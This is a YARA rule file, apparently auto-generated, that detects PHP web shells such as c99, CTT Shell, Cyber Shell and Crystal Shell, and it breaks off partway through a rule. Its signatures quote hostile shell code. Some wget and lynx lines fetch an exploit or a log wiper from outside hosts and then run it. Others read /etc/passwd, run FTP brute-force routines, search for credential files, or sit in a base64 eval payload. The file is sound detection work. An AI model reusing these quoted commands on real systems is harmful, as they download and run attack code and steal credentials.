/*
   YARA Rule Set
   Author: WatcherLab
   Date: 2019-01-02
   Identifier: php
*/

/* Rule Set ----------------------------------------------------------------- */






/* Super Rules ------------------------------------------------------------- */

rule _c99_locus7s_c99_PSych0_0 {
   meta:
      description = "php - from files c99_locus7s.txt, c99_PSych0.php"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash2 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
   strings:
      $x1 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");} " fullword ascii
      $x2 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\"; " fullword ascii
      $x3 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed) " fullword ascii
      $x4 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?ph" ascii
      $x5 = "myshellexec(\"lynx -dump $adires > sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii
      $x6 = "displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\")); " fullword ascii
      $x7 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\"> " fullword ascii
      $x8 = "function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) " fullword ascii
      $x9 = "myshellexec(\"wget $adires -O sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii
      $x10 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x11 = "echo \"<b>Download: </b>&nbsp;<input type=\\\"checkbox\\\" name=\\\"sql_dump_download\\\" value=\\\"1\\\" checked><br><br>\"; " fullword ascii
      $x12 = "<OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed) " fullword ascii
      $x13 = "$logfile = $tmpdir_logs.\"c99sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\"; " fullword ascii
      $x14 = "else {echo \"<b>Execution command</b>\"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}} " fullword ascii
      $x15 = "# MySQL version: (\".mysql_get_server_info().\") running on \".getenv(\"SERVER_ADDR\").\" (\".getenv(\"SERVER_NAME\").\")\".\" " fullword ascii
      $x16 = "echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" name=" ascii
      $x17 = "$fqb_log = \"FTP Quick Brute (called c99shell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\"; " fullword ascii
      $s18 = "if (file_get_contents($v)) {echo \"<b><font color=red>You can't crack winnt passwords(\".$v.\") </font></b><br>\";} " fullword ascii
      $s19 = "else {echo \"<br><a href=\\\"\".$surl.\"act=security&nixpasswd=1&d=\".$ud.\"\\\"><b><u>Get /etc/passwd</u></b></a><br>\";} " fullword ascii
      $s20 = "$acts = array(\"\",\"newdb\",\"serverstatus\",\"servervars\",\"processes\",\"getfile\"); " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _c99_C99Shell_v__1_0_pre_release_build_safe_mode__c99_w4cking_1 {
   meta:
      description = "php - from files c99.txt, C99Shell v. 1.0 pre-release build(safe-mode).txt, c99_w4cking.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
      hash2 = "edffc06506bd512f0676dabb13e88736c88454eb59d421a13319d6db8065b6f7"
      hash3 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
   strings:
      $x1 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");}" fullword ascii
      $x2 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";" fullword ascii
      $x3 = "displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\"));" fullword ascii
      $x4 = "echo \"<br><br><input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Dump\\\"><br><br><b><sup>1</sup></b> - all, if empty\";" fullword ascii
      $x5 = "echo \"<b>Download: </b>&nbsp;<input type=\\\"checkbox\\\" name=\\\"sql_dump_download\\\" value=\\\"1\\\" checked><br><br>\";" fullword ascii
      $x6 = "# MySQL version: (\".mysql_get_server_info().\") running on \".getenv(\"SERVER_ADDR\").\" (\".getenv(\"SERVER_NAME\").\")\".\"" fullword ascii
      $x7 = "$fqb_log = \"FTP Quick Brute (called c99shell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s8 = "echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" name=" ascii
      $s9 = "if (file_get_contents($v)) {echo \"<b><font color=red>You can't crack winnt passwords(\".$v.\") </font></b><br>\";}" fullword ascii
      $s10 = "$acts = array(\"\",\"newdb\",\"serverstatus\",\"servervars\",\"processes\",\"getfile\");" fullword ascii
      $s11 = "else {echo \"<br><a href=\\\"\".$surl.\"act=security&nixpasswd=1&d=\".$ud.\"\\\"><b><u>Get /etc/passwd</u></b></a><br>\";}" fullword ascii
      $s12 = "header(\"Content-disposition: attachment; filename=\\\"\".basename($sql_dump_file).\"\\\";\");" fullword ascii
      $s13 = "header(\"Content-disposition: attachment; filename=\\\"\".$f.\".txt\\\";\");" fullword ascii
      $s14 = "$encoded = chunk_split(base64_encode(file_get_contents($d.$f)));" fullword ascii
      $s15 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.lo" ascii
      $s16 = "getenv(\"PHPRC\").\" -q %f%\" => array(\"php\",\"php3\",\"php4\")," fullword ascii
      $s17 = "echo \"<b>Save to file: </b>&nbsp;<input type=\\\"checkbox\\\" name=\\\"sql_dump_savetofile\\\" value=\\\"1\\\" checked>\";" fullword ascii
      $s18 = "$line[] = \"<a href=\\\"\".$surl.\"act=processes&d=\".urlencode($d).\"&pid=\".$line[1].\"&sig=9\\\"><u>KILL</u></a>\";" fullword ascii
      $s19 = "elseif ($ft == \"sdb\") {echo \"<pre>\"; var_dump(unserialize(base64_decode($r))); echo \"</pre>\";}" fullword ascii
      $s20 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\".substr(decoct(fileperms($d.$f)),-4,4).\")</b><br>" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _C99Shell_v__1_0_beta__5_02_2005__CTT_Shell_ctt_sh_2 {
   meta:
      description = "php - from files C99Shell v. 1.0 beta (5.02.2005).txt, CTT Shell.txt, ctt_sh.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "4def2e67459d28da594f62897d3e9770bff411be14a15420e363cc21731d860d"
      hash2 = "e91635211f44362041fc4c39f11b817e5ff20cf27777cae035284039d63fc53d"
      hash3 = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
   strings:
      $x1 = "if ($win) {$file = \"C:\\\\tmp\\\\dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $x2 = "# \".gethostbyname($SERVER_ADDR).\" (\".$SERVER_ADDR.\")\".\" dump db \\\"\".$db.\"\\\"" fullword ascii
      $x3 = "else {$file = \"/tmp/dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $x4 = "if (file_get_contents($v)) {echo \"<b><font color=\\\"red\\\">You can't crack winnt passwords(\".$v.\") </font></b><br>\";}" fullword ascii
      $s5 = "# MySQL version: (\".mysql_get_server_info().\") running on \".$SERVER_ADDR.\" (\".$SERVER_NAME.\")\".\"" fullword ascii
      $s6 = "if (eregi(\"%%%filedata%%%\",$data)) {$data = str_replace(\"%%%filedata%%%\",file_get_contents($v),$data);}" fullword ascii
      $s7 = "$acts = array(\"\",\"newdb\",\"serverstat\",\"servervars\",\"processes\",\"getfile\");" fullword ascii
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                    ' */
      $s9 = "else {echo \"ERROR. Can't send signal \".htmlspecialchars($sig).\", to process #\".htmlspecialchars($pid).\".\";}" fullword ascii
      $s10 = "<input type=checkbox NAME=world[2] value=1\".$world_x.\">Execute</font></td>" fullword ascii
      $s11 = "<input type=checkbox NAME=group[2] value=1\".$group_x.\">Execute</font></td>" fullword ascii
      $s12 = "if ($sess_method == \"file\") {$sess_data = unserialize(file_get_contents($sess_file));}" fullword ascii
      $s13 = "else {echo \"<form method=\\\"POST\\\"><br>Read first: <input type=\\\"text\\\" name=\\\"fqb_lenght\\\" value=\\\"\".$nixpwdperp" ascii
      $s14 = "elseif ($dump_out == \"download\")" fullword ascii
      $s15 = "if (!in_array($sh,array(\"/bin/bash\",\"/bin/sh\",\"/usr/local/cpanel/bin/jailshell\"))) {$true = false;}" fullword ascii
      $s16 = "if ($dump_out == \"download\") {exit;}" fullword ascii
      $s17 = "if( $mode & 0x200 ) {$world['execute'] = ($world[execute]==\"x\") ? \"t\" : \"T\";}" fullword ascii
      $s18 = "if( $mode & 0x800 ) {$owner['execute'] = ($owner[execute]==\"x\") ? \"s\" : \"S\";}" fullword ascii
      $s19 = "if( $mode & 0x400 ) {$group['execute'] = ($group[execute]==\"x\") ? \"s\" : \"S\";}" fullword ascii
      $s20 = "echo \"<br><form method=\\\"POST\\\"><TABLE cellSpacing=0 cellPadding=1 bgColor=#333333 borderColorLight=#333333 border=1>\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _CTT_Shell_ctt_sh_3 {
   meta:
      description = "php - from files CTT Shell.txt, ctt_sh.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "e91635211f44362041fc4c39f11b817e5ff20cf27777cae035284039d63fc53d"
      hash2 = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
   strings:
      $x1 = "function ctftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x2 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?ph" ascii
      $x3 = "CTT Shell -=[ <? echo $HTTP_HOST; ?> ]=- </title>" fullword ascii
      $s4 = "sql_passwd).\"&sql_server=\".htmlspecialchars($sql_server).\"&sql_port=\".htmlspecialchars($sql_port).\"&sql_act=processes\");" fullword ascii
      $s5 = "$out = \"# Dumped by ctShell.SQL v. \".$cv.\"" fullword ascii
      $s6 = "echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with login " ascii
      $s7 = "else {echo \"<br><a href=\\\"\".$sul.\"act=lsa&nixpasswd=1&d=\".$ud.\"\\\"><b><u>Get /etc/passwd</u></b></a><br>\";}" fullword ascii
      $s8 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$sul.\"act=f&f=accoun" ascii
      $s9 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$sul.\"act=f&f=accoun" ascii
      $s10 = "$aliases[] = array(\"find config* files in current dir\", \"find . -type f -name \\\"config*\\\"\");" fullword ascii
      $s11 = "<input type=checkbox NAME=owner[2] value=1\".$owner_x.\">Execute</font></td><td class=td2><b>Group</b><br><br>" fullword ascii
      $s12 = ":&nbsp;<?php echo php_uname(); ?></b>&nbsp;<b><?php if (!$win) {echo `id`;} else {echo get_current_user();} ?></b>" fullword ascii
      $s13 = "$aliases[] = array(\"find service.pwd files in current dir\", \"find . -type f -name service.pwd\");" fullword ascii
      $s14 = "echo \"<form action=\\\"\".$sul.\"act=cmd\\\" method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"\".htmls" ascii
      $s15 = "nput type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Execute\\\">&nbsp;<input type=\\\"submit\\\" value=\\\"View&Edit command" ascii
      $s16 = "<td class=td2><input type=\"text\" name=\"sql_login\" value=\"root\" maxlength=\"64\"></td><td  class=td2 align=right>" fullword ascii
      $s17 = "$aliases[] = array(\"find config* files\", \"find / -type f -name \\\"config*\\\"\");" fullword ascii
      $s18 = "$aliases[] = array(\"find config.inc.php files\", \"find / -type f -name config.inc.php\");" fullword ascii
      $s19 = "$aliases[] = array(\"find all service.pwd files\", \"find / -type f -name service.pwd\");" fullword ascii
      $s20 = "\\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=\\\"submit\\\" name=\\\"actemptybuff\\\" value=\\\"" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Cyber_Shell__v_1_0__Cyber_Shell_cybershell_4 {
   meta:
      description = "php - from files Cyber Shell (v 1.0).php, Cyber Shell.txt, cybershell.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "26cbe71580362c704b43730cdcb2864b96b9809dcbfeb003983578c2271d34d8"
      hash2 = "fcad6acc432225a3772bda71437c9c8e53f7315634cdfc5b39ff81962dc8b3a5"
      hash3 = "1fb10816489f4edef29b269cafc04bcaf1fa88b256bed4b66a0fc4427bb79545"
   strings:
      $x1 = "<a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</a>, 2002-2006</center>" fullword ascii
      $s2 = "IP: <font face='Tahoma' size='1' color='#000000'>$REMOTE_ADDR &nbsp; $HTTP_X_FORWARDED_FOR</font><br>\";" fullword ascii
      $s3 = "if ((!isset($_GET[pass]) or ($_GET[pass]!=$aupassword)) and ($_SESSION[aupass]==\"\"))" fullword ascii
      $s4 = "header(\"Content-Type: application/force-download; name=\\\"$filen\\\"\");" fullword ascii
      $s5 = "$s.=sprintf(\"%1s%1s%1s\", $group['read'], $group['write'], $group['execute']); " fullword ascii
      $s6 = "$s.=sprintf(\"%1s%1s%1s\", $owner['read'], $owner['write'], $owner['execute']); " fullword ascii
      $s7 = "$s.=sprintf(\"%1s%1s%1s\", $world['read'], $world['write'], $world['execute']); " fullword ascii
      $s8 = "$headers = \"From: $from\\nContent-type: multipart/mixed; boundary=\\\"$boundary\\\"\";" fullword ascii
      $s9 = "shell.php?pass=mysecretpass" fullword ascii
      $s10 = "if (!empty($_GET[mailfile])) anonim_mail($email,$email,$_GET[mailfile],'File: '.$_GET[mailfile],$_GET[mailfile]);" fullword ascii
      $s11 = "if (!empty($_GET[downloadfile])) downloadfile($_GET[downloadfile]);" fullword ascii
      $s12 = "*   Coded by Pixcher" fullword ascii
      $s13 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&show\\\">\";" fullword ascii
      $s14 = "header(\"Content-Transfer-Encoding: binary\");" fullword ascii
      $s15 = "*   Lite version of php web shell " fullword ascii
      $s16 = "header(\"Content-Disposition: attachment; filename=\\\"$filen\\\"\");" fullword ascii
      $s17 = "echo \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"3;URL=$PHP_SELF?d=$d&show\\\">\";}" fullword ascii
      $s18 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?d=$mydir&show\\\">\";" fullword ascii
      $s19 = "if (isset($show) or isset($_REQUEST[edit]) or isset($_REQUEST[tools]) or isset($_REQUEST[db_user]) or isset($_REQUEST[diz])){" fullword ascii
      $s20 = "if (isset($show) or isset($_REQUEST[edit]) or isset($_REQUEST[tools]) or isset($_REQUEST[db_user]) or isset($_REQUEST[diz]))" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Crystal_shell_Crystal_CrystalShell_v_1_5 {
   meta:
      description = "php - from files Crystal shell.txt, Crystal.txt, CrystalShell v.1.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "689472bcb32c4d627e4e33d54e72918e549c0cbf1136546048a3526ec3addf4e"
      hash2 = "8cbde0e322651be9d980fe33ddee4844beabc7ded6fbc270d92a3772cd25f284"
      hash3 = "278f96d0767d7ac781b617b189bc56a618f341887c2385a4b0af4676070c0171"
   strings:
      $x1 = "<table id=tb><tr><td>Execute:<INPUT type=\\\"text\\\" name=\\\"cmd\\\" size=30 value=\\\"$cmd\\\"></td></tr></table>" fullword ascii
      $x2 = "print \"<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>\";" fullword ascii
      $x3 = ". ini_get('safe_mode_include_dir') . \"<br>Exec here: \" . ini_get('safe_mode_exec_dir'). \"</b></font>\";}" fullword ascii
      $x4 = "print \"<center><div id=logostrip>Download - OK. (\".$sizef.\"??)</div></center>\";" fullword ascii
      $s5 = "list file attributes on a Linux second extended file system</option><option value=\"netstat -an | grep -i listen\">" fullword ascii
      $s6 = "echo \"<center><div id=logostrip>Command: $cmd<br><textarea cols=100 rows=20>\";" fullword ascii
      $s7 = "copy($HTTP_POST_FILES[\"userfile\"][\"tmp_name\"],$HTTP_POST_FILES[\"userfile\"][\"name\"]);" fullword ascii
      $s8 = "if(isset($_POST['post']) and $_POST['post'] == \"yes\" and @$HTTP_POST_FILES[\"userfile\"][name] !== \"\")" fullword ascii
      $s9 = "find service.pwd files in current dir</option><option value=\"find / -type f -name .htpasswd\">" fullword ascii
      $s10 = "find all writable directories and files in current dir</option><option value=\"find / -type f -name service.pwd\">" fullword ascii
      $s11 = "<input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Exec\\\" id=input></form></center></div>\";" fullword ascii
      $s12 = "<font face=Verdana size=-2><a href=\"?act=command\">Executed command</a></font><b> ::</b></p></td></tr><tr><td width=\"50%\" hei" ascii
      $s13 = "<font face=Verdana size=-2><a href=\"?act=command\">Executed command</a></font><b> ::</b></p></td></tr><tr><td width=\"50%\" hei" ascii
      $s14 = "echo \"<center><div id=logostrip>Results of PHP execution<br><br>\";" fullword ascii
      $s15 = "find config* files</option><option value=\"find . -type f -name &quot;config*&quot;\">" fullword ascii
      $s16 = "find config.inc.php files</option><option value=\"find / -type f -name &quot;config*&quot;\">" fullword ascii
      $s17 = "find config* files in current dir</option><option value=\"find / -perm -2 -ls\">" fullword ascii
      $s18 = "find sgid files in current dir</option><option value=\"find / -type f -name config.inc.php\">" fullword ascii
      $s19 = "ArabSecurityCenter Team <br>CRYSTAL-H Version:0 Beta phpshell code<br>Saudi Arabic  </a>.</b>\";}" fullword ascii
      $s20 = "find all service.pwd files</option><option value=\"find . -type f -name service.pwd\">" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x0a0d ) and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _c99_C99Shell_v__1_0_beta__5_02_2005__C99Shell_v__1_0_pre_release_build_safe_mode__c99_w4cking_CTT_Shell_ctt_sh_6 {
   meta:
      description = "php - from files c99.txt, C99Shell v. 1.0 beta (5.02.2005).txt, C99Shell v. 1.0 pre-release build(safe-mode).txt, c99_w4cking.txt, CTT Shell.txt, ctt_sh.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
      hash2 = "4def2e67459d28da594f62897d3e9770bff411be14a15420e363cc21731d860d"
      hash3 = "edffc06506bd512f0676dabb13e88736c88454eb59d421a13319d6db8065b6f7"
      hash4 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash5 = "e91635211f44362041fc4c39f11b817e5ff20cf27777cae035284039d63fc53d"
      hash6 = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
   strings:
      $s1 = "echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($sq" ascii
      $s2 = "echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with login " ascii
      $s3 = "$sql_sock = mysql_connect($sql_server.\":\".$sql_port, $sql_login, $sql_passwd);" fullword ascii
      $s4 = "$encoded = substr(preg_replace(\"!.{1,76}!\",\"'\\\\0'.\\n\",$encoded),0,-2);" fullword ascii
      $s5 = "if (@ftp_login($sock,$login,$pass))" fullword ascii
      $s6 = "if ($sql_login)  {$sql_surl .= \"&sql_login=\".htmlspecialchars($sql_login);}" fullword ascii
      $s7 = "if (!$fp) {echo \"Can't get /etc/passwd for password-list.\";}" fullword ascii
      $s8 = "$sock = @ftp_connect($host,$port,$timeout);" fullword ascii
      $s9 = "d dump of \\$GLOBALS.</b></center>\";}" fullword ascii
      $s10 = "$content = @file_get_contents($uploadurl);" fullword ascii
      $s11 = "$tmp = ob_get_contents();" fullword ascii
      $s12 = "$uploadfile = $HTTP_POST_FILES[\"uploadfile\"];" fullword ascii
      $s13 = "while(file_exists($uploadpath.$destin)) {if ($i > 0) {$b = \"_\".$i;} $destin = \"index\".$b.\".html\"; $i++;}}" fullword ascii
      $s14 = "echo \"<textarea cols=80 rows=10>\".htmlspecialchars($encoded).\"</textarea><br><br>\";" fullword ascii
      $s15 = "$encoded = \"\";" fullword ascii
      $s16 = "if ($sql_act == \"processes\")" fullword ascii
      $s17 = "elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile).\"\\\"</b>: access denied\";}" fullword ascii
      $s18 = "if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile).\"\\\"</b>: object alredy exists\";}" fullword ascii
      $s19 = "elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and" ascii
      $s20 = "$ret = mysql_dump($set);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _C99madShell_v__2_0_madnet_edition_c99_madnet_7 {
   meta:
      description = "php - from files C99madShell v. 2.0 madnet edition.txt, c99_madnet.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "ac22717875ec08d5ca32ca6b1846917e63f8a4db4de56138f782ac231e9a784f"
      hash2 = "8b60f1c80a257f223a27ed1b76417ecbe094eb6aeb8dfad6a3872214d8287ab5"
   strings:
      $s1 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXefMcFUL5EXf/yqceii7e8n9JvOYE9t8sT8cs//cfWUXldLpKsQ" ascii
      $s2 = "mPmzrSRKnKbw5lJO1q3V/r9hzkMTXFFrvdS98lAPPozktM4vrswrDgEtQBy3GeqL4W0mU+IldKt1CZBrlBcLxBIcIBplsFNeKcIwkPMs9lzQsGhNKab/feemSpYMafhp" ascii
      $s3 = "QGNXL8g3lh05mwGsXLdoM9GYE4nLVvcbiqHckzOtbKVOUiJxOTl583fXaidSVdAE9pysVxYRtos1niAuqiEh1XnBcRUn3gj0YbxCOGnbAVUlpTw8Ux0m3kJcOmxdch80" ascii
      $s4 = "jfcynQFxSDXK92H52no+S2kMdAOFDpJ+O6mZD7fZLyiyhkTFtXnbHYj8sFY3wbTAFW17/9Ken0kpXF4E5hFQNxvVnpjSjUQsnOjTLoBNpSSC1/NxFGKRqDTVLvjP8p0C" ascii
      $s5 = "d3VjSptiWvihNOrfF8trcmeEcuEVz1GLjFWHY/Ko8MZ6x20KFD90BUoNVUidJTLy5CyJtoV76rc/HKnnIjclgbvGmftP/CwlIz5IbtWxDHgGCoOvVbQzTWqh9eVW/l1s" ascii
      $s6 = "dksJN31Cv3aT8GrKxInvPvi966ycFZngqKlHYx1Nhce2HGnYpB62VpnR1FlvuutbgxzV1+getzTKgskAhrfGk0W3/133ePfFrmBWjfni18FsgrSTlK+AG3Yb6+lXxTxi" ascii
      $s7 = "pEYeO7Wu44I9jxnmPRhJZjKw7IRqqF57Do3cPYIT1Q4U/ptWiqmfAX4RwgIuEz0DyBNUcGxucWm0wDnzyQqGkqyp6dPUipEKLTeK+APNIqw/vowtPMFtfPUkLMtF0cHf" ascii
      $s8 = "LmFYCnDUTOz0dI3dp0GRCSuVdxadPSWMy2rcLsI8sbva/PtUKECQNhjuEge5jguzRQk8HIeoUSMtRYj3OyWVvK8dMtNVdlLxE/Ga9MwppDBY/x9S3Fwxp47cbF3s5qde" ascii
      $s9 = "hZBQ4nAkjQh9XPL2min2vv0dajooTzMHx+WadmWy4qAaIsQtN7WSByMH+3DWS0mKPJGhKNmSVe24Q1eZ8PvyMB1k12yj92FT1Fp4eSRCOEYe57dlYrE6K0dKfOmzsVUZ" ascii
      $s10 = "g8nxeAdqbAgaeKniW0bUZcQ2xiykVMx9ltmpVLi955NhvFfgtJ5h8AHqEN1+BP98zS8aq4hiYTMY8K5quUACJrJ4IlB4pvhvnIvt+Oho2nBpiiw2UEMtisXEZtEBeBsE" ascii
      $s11 = "bPpAhTmOSzT15HhyKgj6CRXfsHcWEUCyeS+CcjsN8B+QE29qKQ8Hg4BiNHgeIIwA0kq64Gy9l9ubtCCfEcJyEW+l435spwREDeimRmwsk74L/Tlg3YkPLVH4Ku0fm7H0" ascii
      $s12 = "$md5_pass = \"\"; //If no pass then hash" fullword ascii
      $s13 = "C2OCB6Gds5T7dJIsm2wrS+Y/O19dCsltUVCNIAWIIgeFb//eeff/79z/8A')));" fullword ascii
      $s14 = "pwKmBiu0XhcOc1HX78wz8rIH6ObDR/8tvqYMTnm2KhXiLdGKSikfb5UdeXrQXY6AX5m5GeT8rAHrTRvCnlLpBYGUb+Odz+pY9ifkIQHrajr5CasIQCBzhJkupSV8DG3a" ascii
      $s15 = "VXRA6iEccOH+RMyIydrczXNYDAqpEa5MgujPIhHb7PDyJwwcUQQ9U3I23BDGx2xswwKpQYua8fayvHuIVkc1TtjD+tiviQbZqdaUBkTVBqU4wpxS6xysL8/eYE75Twca" ascii
      $s16 = "Fds62rMSUwl5p1Csou7TxaqTMzFW/kFxBiEVJS87cxRYvUbdpfyPfTW1A1WIrc0TDbv8PXXf5mN/I04dICA7nCePoE9xJ3b5pUhn/7yCXa/VsPho8VqwJ6pxx24NDfF/" ascii
      $s17 = "o9Mjsg9bn5wRzL7HLBCiYQmWmW6TjASqFvSEy5SMq9If+c7COZuMSUUPDzXWhNQ/5906ZXosBiaATBqg0gQs/+OZRpkYcNBjrt/O6blAyEFOfy1GtdXVhRAh//xDAujx" ascii
      $s18 = "U2K3arFNbtSEuVnrgrEOQOs/BWoL3ObhI4Om2i2utBBJTdYUrWQq5K5FQ1C+r6jUyu3umr0YaSeyr//HwOKJ3517OuUXUxy3psTeed71YSHycKd2iwDAxqXxqhglsvYn" ascii
      $s19 = "y01iJCindm5/JxKOWnVD+XoSXpvkV3YAEAE9nIuU/crhUx+rQGA/dnPOSRY3zd71hurXJeIX95lC79CN//po1b30Lwo3pGQDBlSO7XY90P1e6YXd1bXtCHrVrHCcSlwG" ascii
      $s20 = "b7OIuCyWksqIlhF5udVNzz4hHWUhYKie9OCoBg627FMNP6sA0sd9jyaE4IMcBCd22tUQ2WnF71Wvv2piaWlsaRA4SJGNGNdj2Rx80LMbqpEULdJqHKCKknP//mf/PJOp" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99_C99Shell_v__1_0_pre_release_build_safe_mode__8 {
   meta:
      description = "php - from files c99.txt, C99Shell v. 1.0 pre-release build(safe-mode).txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
      hash2 = "edffc06506bd512f0676dabb13e88736c88454eb59d421a13319d6db8065b6f7"
   strings:
      $x1 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?ph" ascii
      $x2 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x3 = "$logfile = $tmpdir_logs.\"c99sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s4 = "<center><a href=\\\"\".$surl.\"act=processes&grep=\".basename($binpath).\"\\\"><u>View datapipe process</u></a></center>\";}" fullword ascii
      $s5 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
